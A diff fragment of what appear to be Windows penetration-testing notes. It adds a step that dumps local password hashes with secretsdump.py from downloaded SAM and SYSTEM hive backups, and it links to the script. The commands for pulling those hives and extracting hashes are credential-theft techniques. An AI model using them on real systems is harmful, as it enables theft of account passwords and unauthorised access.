@@ -35,5 +35,11 @@ This documents is for windows
 `download sam.bak` \
 `download system.bak`
 
+- Dump password hash\
+`python3 secretsdump.py -sam sam.bak -system system.bak LOCAL`\
+> [!IMPORTANT]
+> Download the python [file](https://github.com/fin3ss3g0d/secretsdump.py/blob/main/secretsdump.py).
+
+
 
 ---
